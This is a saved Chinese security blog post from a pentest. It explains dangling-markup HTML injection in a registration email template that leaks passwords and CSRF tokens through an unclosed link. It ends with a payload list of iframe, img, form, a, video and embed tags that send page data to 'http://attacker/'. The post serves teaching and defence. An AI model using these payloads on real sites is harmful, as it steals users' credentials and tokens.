@@ -1,0 +1,367 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>基于HTML注入的一种攻击思路 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="背景这是我最近在做某个渗透项目时遇到的一个场景，觉得很有意思，所以记录了下来。先来思考一下，如果有一个点，可以插入一些常用标签，按漏洞分类的话应归属于 HTML 注入，但就是不能执行事件执行 J..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="基于HTML注入的一种攻击思路 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/247.html" />
+<link rel="alternate" type="application/rdf+xml" title="基于HTML注入的一种攻击思路 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/247.html" />
+<link rel="alternate" type="application/atom+xml" title="基于HTML注入的一种攻击思路 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/247.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-247'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-247'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-247'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _LY1 = //'SRY'
+'5de'+'011'//'C3f'
++//'Uh7'
+'b'+'ce'//'SAl'
++//'V2g'
+'31'+'BYM'//'BYM'
++'c'//'5'
++''///*'V'*/'V'
++//'XFO'
+'0c6'+//'1CN'
+'7e1'+//'xAQ'
+'9'+''///*'f'*/'f'
++''///*'dp'*/'dp'
++//'T7O'
+'T7O'+//'C'
+'C'+'90'//'90'
++'02'//'OZ6'
++//'8'
+'20'+'5'//'CAP'
++'9'//'B'
++'a'//'CF'
++'86'//'p'
++//'5c'
+'5c'+//'ubO'
+'a67'+//'AV'
+'AV'+''///*'dk'*/'dk'
++//'6m'
+'2', _0ksZ0 = [[11,14],[19,22],[19,20],[19,21],[28,30],[31,33]];
+    
+    for (var i = 0; i < _0ksZ0.length; i ++) {
+        _LY1 = _LY1.substring(0, _0ksZ0[i][0]) + _LY1.substring(_0ksZ0[i][1]);
+    }
+
+    return _LY1;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">基于HTML注入的一种攻击思路</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-10-28 20:33:00" itemprop="datePublished">2019-10-28 20:33:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/247.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/247.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>背景</h1><p>这是我最近在做某个渗透项目时遇到的一个场景，觉得很有意思，所以记录了下来。</p><p>先来思考一下，如果有一个点，可以插入一些常用标签，按漏洞分类的话应归属于 HTML 注入，但就是不能执行事件执行 JS（我这里指的是一定不会执行 JS）你会怎么利用？</p><p>iframe 钓鱼？css 注入？CSRF？这些都是我们比较常用的方法，得分场景利用。</p><p>再来说一下我最近遇到的这个点。</p><p>这是一个注册用户功能，用户填好个人信息和注册邮箱后，系统会自动生成一个随机密码，然后会按照“欢迎注册”的模板，替换里面的变量，发送一封欢迎注册的 HTML 邮件给用户。</p><p>这个注册邮件里包含了这些信息：账号、密码、超链接。</p><p>其中账号是用户写的，密码是随机生成的。</p><p>这份邮件分为中文部分和英文部分，大概类似下面这样。</p><pre><code>亲爱的 XXX，欢迎注册XXX，您的初始密码是：123456。
+...
+http://www.xxx.com/xxx
+...
+Dear XXX, welcome to register XXX. Your initial password is 123456. 
+...
+http://www.xxx.com/xxx
+...</code></pre><p>而超链接的一部分正好是我可控的。</p><p>也就是说当我修改了这个“超链接”后，每个用户在注册时收到的邮件里包含的那个超链接是被我修改过的。</p><p>由于触发点是某邮件系统客户端，XSS 没戏，只能靠最传统的几个标签来完成攻击。</p><h1>利用方法</h1><p>背景已交代详细，下面我来说下我的利用方法。</p><p>由于是授权的保密项目，不方便透露，所以我将大致功能模拟了一下。</p><p>“欢迎注册”的邮件模板大致是这个样子的</p><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;欢迎注册&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div x=&quot;xxx&quot;&gt;
+    &lt;p x=&quot;xxx&quot;&gt;您的账号是 {1} 密码是 {2} &lt;/p&gt;
+    &lt;p x=&quot;xxx&quot;&gt;登录地址：&lt;/p&gt;
+    &lt;a href=&quot;{3}&quot;&gt;{3}&lt;/a&gt;
+&lt;/div&gt;
+
+&lt;div x=&quot;xxx&quot;&gt;
+    &lt;p x=&quot;xxx&quot;&gt;your account is {1} password is {2} &lt;/p&gt;
+    &lt;p x=&quot;xxx&quot;&gt;login address：&lt;/p&gt;
+    &lt;a href=&quot;{3}&quot;&gt;{3}&lt;/a&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>这段HTML邮件模板里用户名、密码、超链接分别对应的点是 {1} {2} {3}，{3} 超链接是我可控的点。</p><p>当用户注册时，就会把这三个变量提取出来，替换到它们对应的位置上，然后发送邮件给用户。</p><p>一般这种情况，简单一点的利用方式就是，插入一个自己服务器的钓鱼 URL，然后诱导注册者点击访问。</p><p>我构造了这样一段 payload。使它的危害等级可以升级一个 level。</p><pre><code>&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://b1ue.cn/?</code></pre><p>替换掉 {3} 后源码如下，能看懂这段 HTML 也就能明白我要做什么了。</p><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;欢迎注册&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;div x=&quot;xxx&quot;&gt;
+    &lt;p x=&quot;xxx&quot;&gt;您的账号是 {1} 密码是 {2} &lt;/p&gt;
+    &lt;p x=&quot;xxx&quot;&gt;登录地址：&lt;/p&gt;
+    &lt;a href=&quot;&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://b1ue.cn/?&quot;&gt;&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://b1ue.cn/?&lt;/a&gt;
+&lt;/div&gt;
+
+&lt;div x=&quot;xxx&quot;&gt;
+    &lt;p x=&quot;xxx&quot;&gt;your account is {1} password is {2} &lt;/p&gt;
+    &lt;p x=&quot;xxx&quot;&gt;login address：&lt;/p&gt;
+    &lt;a href=&quot;&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://b1ue.cn/?&quot;&gt;&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://b1ue.cn/?&lt;/a&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p>我要做的事就是，<strong>创建一个超链接，把邮件里的敏感信息（用户名、密码）携带进来，当用户点击我带有诱导性的超链接时就会把他的账号密码发送到我的服务器。</strong></p><p>因为可控点是一个，但输出点是两个，要考虑到页面完整展示，所以 payload 看起来有点奇怪。</p><p>实际上最后展示在邮件页面上的就是一个 a 标签。</p><pre><code>&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://b1ue.cn/?&lt;/a&gt;
+&lt;/div&gt;
+
+&lt;div x=&quot;xxx&quot;&gt;
+    &lt;p x=&quot;xxx&quot;&gt;your account is {1} password is {2} &lt;/p&gt;
+    &lt;p x=&quot;xxx&quot;&gt;login address：&lt;/p&gt;
+    &lt;a href=&quot;&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;</code></pre><p>这是一个完整的 a 标签，重点在于 这个a 标签的 href 属性使用了单引号 <code>'</code> 包裹 URL，和页面上的其他标签的双引号<code>&quot;</code>没有起冲突，最后由 payload里的 标签的 x 属性这段 <code>'&gt;点击此链接激活账号&lt;/a&gt;&lt;!--'</code> 来结束 a 标签并且注释掉后面的标签，让页面看起来是正常的。</p><p>来看一下在浏览器里访问的效果。</p><p><img src="/usr/uploads/2019/10/3077358047.jpg" alt="1572271303(1).jpg" title="1572271303(1).jpg"></p><p>当我点击这个“点击此链接激活账号”超链接时，就会把账号和密码英文部分的html携带到我服务器 <code>http://b1ue.cn</code>  的参数部分。</p><p>我把大致的场景写了一个简单的 DEMO，源码上传到了 github。</p><p><a href="https://github.com/iSafeBlue/HTML-based-injection-attack-demo" target="_blank">https://github.com/iSafeBlue/HTML-based-injection-attack-demo</a></p><p>首先启动这个 springboot 项目，默认 8080 端口。</p><p>然后打开首页就是一个注册页面。</p><p><img src="/usr/uploads/2019/10/3141555252.jpg" alt="1572272549(1).jpg" title="1572272549(1).jpg"></p><p>在表单里输入邮箱，或直接访问这个 URL，就会发送邮件。</p><blockquote><p><a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a>:8080/register?email=xxx%403dmail.top</p></blockquote><p>先来看一下正常的邮件。</p><p><img src="/usr/uploads/2019/10/1030718852.jpg" alt="1572272827(1).jpg" title="1572272827(1).jpg"></p><pre><code>http://127.0.0.1:8080/set?key=portal_url&amp;value=&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://127.0.0.1/?</code></pre><p>然后再去修改邮件模板中 {3} 位置的超链接 URL 为我的 payload</p><pre><code>&lt;/a&gt;&lt;a x='&gt;点击此链接激活账号&lt;/a&gt;&lt;!--' href='http://127.0.0.1/?</code></pre><p>修改成功后重新给我的邮箱发送一封注册邮件</p><blockquote><p><a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a>:8080/register?email=xxx%403dmail.top</p></blockquote><p>这时再去点击这个我注入进去的超链接，就会把生成的随机密码携带到我的服务器里。</p><p><img src="/usr/uploads/2019/10/3640392374.jpg" alt="1572273314(1).jpg" title="1572273314(1).jpg"></p><h1>举一反三</h1><p>这种攻击方法，当然不仅仅局限于这一种场景，也不局限于一个 a 标签。</p><p>也可以是 form 标签、img 标签、iframe 标签等可以跨域请求的标签。</p><p>仔细思考一下，其实有很多可以利用的场景，我举几个例子</p><h4>场景1：截获 TOKEN</h4><p>TOKEN 一般用于防御 CSRF，有些网站它会把 TOKEN 放在 hidden input 标签里。<br>也有一些会携带到超链接里（如 discuz）。</p><pre><code>{1}
+&lt;div&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;CSRF_TOKEN&quot; value=&quot;bbbc91aa69902418cad12b17e4df1d0d&quot;&gt;
+&lt;/div&gt;
+{2}</code></pre><p>上面这段代码的 {1} 和 {2} 如果可控，那可以构造这样的 payload。</p><pre><code>{1}=&lt;img src='http://b1ue.cn/?
+{2}='&gt;</code></pre><p><img src="/usr/uploads/2019/10/3463625598.jpg" alt="1572274604(1).jpg" title="1572274604(1).jpg"></p><p>payload 如下。</p><pre><code>http://127.0.0.1:8080/token?point1=&lt;img src='http://127.0.0.1/?&amp;point2='&gt;</code></pre><h4>场景2：截获后台信息</h4><p>拿留言举例，你可以留下两条留言。</p><p>第一条是<code>'&gt;</code>，隔一段时间再留第二条<code>&lt;img src='http://b1ue.cn/?</code>。</p><p>如果对方后台留言是时间倒序展示，你就可以看到第一条到第二条留言这段时间其他人的留言。</p><p>此处不再做演示。</p><h1>总结</h1><p>当然以上情况都是建立在可以插入 HTML 标签，且两个可控点之间的 HTML 包含敏感信息且没有单引号（或双引号）阻断。<br>其实如果可控点只有一个的话，那就需要找找页面里面有没有 '&gt; 或者 "&gt; ，这样就可以只用一个点来触发。</p><p>最后我总结出几种利用的 payload 供参考学习。</p><ul><li><strong>iframe</strong></li></ul><pre><code>http://target/token?point1=&lt;iframe src='http://attacker/?&amp;point2='&gt;&lt;/iframe&gt;</code></pre><ul><li><strong>img</strong></li></ul><pre><code>http://target/token?point1=&lt;img src='http://attacker/?&amp;point2='&gt;</code></pre><pre><code>http://target/token?point1=&lt;image src='http://attacker/?&amp;point2='&gt;aaa&lt;/image&gt;</code></pre><ul><li><strong>form</strong></li></ul><pre><code>http://target/token?point1=&lt;form action='http://attacker/&amp;point2='&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><pre><code>http://target/token?point1=&lt;form action=&quot;http://attacker&quot; method=&quot;post&quot;&gt;&lt;textarea name=&quot;x&quot;&gt;&amp;point2=&lt;/textarea&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><pre><code>http://target/token?point1=&lt;form&gt;&lt;input type=&quot;submit&quot; formaction='http://attacker/&amp;point2='&gt;&lt;/form&gt;</code></pre><ul><li><strong>a</strong></li></ul><pre><code>http://target/token?point1=&lt;a href='http://attacker/?&amp;point2='&gt;click me&lt;/a&gt;</code></pre><pre><code>http://target/token?point1=&lt;math href='http://attacker/?&amp;point2='&gt;aaa&lt;/math&gt;</code></pre><ul><li><strong>video</strong></li></ul><pre><code>http://target/token?point1=&lt;video src='http://attacker/?&amp;point2='&gt;aaa&lt;/video&gt;</code></pre><pre><code>http://target/token?point1=&lt;video&gt;&lt;source src='http://attacker/?&amp;point2='&gt;aaa&lt;/source&gt;&lt;/video&gt;</code></pre><ul><li><strong>embed</strong></li></ul><pre><code>http://target/token?point1=&lt;embed src='http://attacker/?&amp;point2='&gt;aaa&lt;/embed&gt;</code></pre><p>其他场景和利用方法还得靠大家自由发挥。</p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-247" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/247.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/247.html#respond-post-247" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
